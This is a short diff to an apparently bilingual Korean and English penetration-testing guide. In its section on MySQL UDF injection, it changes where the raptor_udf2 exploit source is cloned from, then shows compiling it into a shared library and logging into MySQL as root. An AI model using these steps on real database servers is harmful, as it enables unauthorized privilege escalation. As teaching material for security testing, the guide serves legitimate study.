@@ -239,8 +239,8 @@ UDF(User Defined Function) 인젝션은 MySQL에서 공유 라이브러리를 �
 
 ```bash
 # 도구 준비
-git clone https://github.com/RalfHacker/raptor_udf2.git
-gcc -shared -fPIC raptor_udf2.c -o raptor_udf2.so
+git clone https://github.com/1N3/PrivEsc.git
+gcc -shared -fPIC PrivEsc/mysql/raptor_udf2.c -o raptor_udf2.so
 
 # MySQL 로그인 후
 mysql -u root -p
@@ -592,8 +592,8 @@ UDF (User Defined Function) injection loads a shared library in MySQL to obtain 
 
 ```bash
 # Prepare tool
-git clone https://github.com/RalfHacker/raptor_udf2.git
-gcc -shared -fPIC raptor_udf2.c -o raptor_udf2.so
+git clone https://github.com/1N3/PrivEsc.git
+gcc -shared -fPIC PrivEsc/mysql/raptor_udf2.c -o raptor_udf2.so
 
 # After MySQL login
 mysql -u root -p
